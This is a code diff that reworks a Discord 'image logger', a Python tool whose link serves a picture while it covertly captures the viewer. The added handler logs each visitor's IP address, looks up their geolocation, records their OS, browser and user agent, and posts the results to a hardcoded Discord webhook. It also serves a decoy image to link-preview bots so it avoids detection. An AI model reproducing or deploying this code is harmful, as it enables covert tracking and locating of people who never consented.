@@ -1,39 +1,15 @@
-# Discord Image Logger by DeKrypt
-
-from http.server import BaseHTTPRequestHandler
-from urllib import parse
-import traceback, requests, base64, httpagentparser
-
-__version__ = "v2.0"
-__author__ = "DeKrypt"
+import requests
+import base64
+import httpagentparser
+from urllib.parse import urlparse, parse_qs
 
 config = {
-    # Base configuration
     "webhook": "https://discord.com/api/webhooks/1400921771162472609/9jkFkHpoNDKdySJCy_K9T62p3xzEdUxYAGfHwTX4WirLE5kBgv7U7QmL37k1WmSPZq6f",
     "image": "https://i1.sndcdn.com/artworks-OzDwK6RkxuC6Ujy4-1VoVyg-t500x500.jpg",
     "imageArgument": True,
     "username": "Image Logger",
     "color": 0x00FFFF,
-    "crashBrowser": False,
-    "accurateLocation": False,
-
-    # Message customization
-    "message": {
-        "doMessage": False,
-        "message": "This browser has been pwned by DeKrypt's Image Logger.",
-        "richMessage": True
-    },
-
-    "vpnCheck": 1,
-    "linkAlerts": True,
     "buggedImage": True,
-    "antiBot": 1,
-
-    # Optional redirect
-    "redirect": {
-        "redirect": False,
-        "page": "https://your-link.here"
-    }
 }
 
 blacklistedIPs = ("27", "104", "143", "164")
@@ -45,42 +21,29 @@ def botCheck(ip, useragent):
         return "Telegram"
     return False
 
-def reportError(error):
-    requests.post(config["webhook"], json={
-        "username": config["username"],
-        "content": "@everyone",
-        "embeds": [{
-            "title": "Image Logger - Error",
-            "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n```\n{error}\n```"
-        }]
-    })
-
-def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
+def makeReport(ip, useragent=None, endpoint="N/A", url=False):
     if ip.startswith(blacklistedIPs):
         return
 
     bot = botCheck(ip, useragent)
     if bot:
-        if config["linkAlerts"]:
-            requests.post(config["webhook"], json={
-                "username": config["username"],
-                "content": "",
-                "embeds": [{
-                    "title": "Image Logger - Link Sent",
-                    "color": config["color"],
-                    "description": (
-                        f"An **Image Logging** link was sent!\n"
-                        f"**Endpoint:** `{endpoint}`\n"
-                        f"**IP:** `{ip}`\n"
-                        f"**Platform:** `{bot}`"
-                    )
-                }]
-            })
+        requests.post(config["webhook"], json={
+            "username": config["username"],
+            "content": "",
+            "embeds": [{
+                "title": "Image Logger - Link Sent",
+                "color": config["color"],
+                "description": (
+                    f"An **Image Logging** link was sent!\n"
+                    f"**Endpoint:** `{endpoint}`\n"
+                    f"**IP:** `{ip}`\n"
+                    f"**Platform:** `{bot}`"
+                )
+            }]
+        })
         return
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
-
     ping = "@everyone" if not info.get("proxy") else ""
     os, browser = httpagentparser.simple_detect(useragent)
 
@@ -93,7 +56,7 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
             "description": (
                 f"**A User Opened the Original Image!**\n"
                 f"**Endpoint:** `{endpoint}`\n"
-                f"**IP Info:** … and so on …\n"
+                f"**IP Info:** …\n"
                 f"**PC Info:** OS: `{os}`, Browser: `{browser}`\n"
                 f"**User Agent:** ```{useragent}```"
             )
@@ -106,55 +69,57 @@ def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
     requests.post(config["webhook"], json=embed)
     return info
 
-binaries = {
-    "loading": base64.b85decode(
-        b'...base85 loading image...'
-    )
-}
 
-class ImageLoggerHTTP(BaseHTTPRequestHandler):
-    def do_GET(self):
-        try:
-            if self.headers.get('x-forwarded-for', '').startswith(blacklistedIPs):
-                return
+# You can replace this loading image with your own base85-decoded bytes
+bugged_loading_image = base64.b85decode(
+    b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000'
+)
 
-            ip = self.headers.get('x-forwarded-for')
-            ua = self.headers.get('user-agent', '')
-            bot = botCheck(ip, ua)
-            s = self.path
-            dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
-            url = dic.get("url", config["image"]) if config["imageArgument"] else config["image"]
+async def handler(request):
+    headers = request.headers
+    ip = headers.get("x-forwarded-for", "")
+    useragent = headers.get("user-agent", "No User Agent")
 
-            if bot:
-                self.send_response(200 if config["buggedImage"] else 302)
-                if config["buggedImage"]:
-                    self.send_header('Content-type', 'image/jpeg')
-                    self.end_headers()
-                    self.wfile.write(binaries["loading"])
-                else:
-                    self.send_header('Location', url)
-                    self.end_headers()
-                makeReport(ip, endpoint=s.split("?")[0], url=url)
-                return
+    # Parse query string
+    url = config["image"]
+    if config["imageArgument"]:
+        qs = urlparse(request.url).query
+        params = parse_qs(qs)
+        if "url" in params:
+            url = params["url"][0]
 
-            # actual click
-            self.send_response(200)
-            self.send_header('Content-type', 'image/jpeg')
-            self.end_headers()
-            self.wfile.write(requests.get(url).content)
+    bot = botCheck(ip, useragent)
 
-            info = makeReport(ip, ua, endpoint=s.split("?")[0], url=url)
-            if config["message"]["doMessage"]:
-                # handle rich message substitution here…
-                pass
+    if bot:
+        # For bots, respond with bugged image or redirect
+        if config["buggedImage"]:
+            return {
+                "statusCode": 200,
+                "headers": {"Content-Type": "image/jpeg"},
+                "body": bugged_loading_image,
+                "isBase64Encoded": True
+            }
+        else:
+            return {
+                "statusCode": 302,
+                "headers": {"Location": url},
+                "body": ""
+            }
 
-        except Exception as e:
-            self.send_response(500)
-            self.send_header('Content-type', 'text/html')
-            self.end_headers()
-            self.wfile.write(b'500 - Internal Server Error')
-            reportError(traceback.format_exc())
+    # For normal users, fetch the image and respond
+    try:
+        img_response = requests.get(url)
+        img_response.raise_for_status()
+        makeReport(ip, useragent, endpoint=request.url.split("?")[0], url=url)
 
-    do_POST = do_GET
-
-handler = ImageLoggerHTTP
+        return {
+            "statusCode": 200,
+            "headers": {"Content-Type": "image/jpeg"},
+            "body": img_response.content,
+            "isBase64Encoded": True
+        }
+    except Exception as e:
+        return {
+            "statusCode": 500,
+            "body": f"Internal Server Error: {str(e)}"
+        }
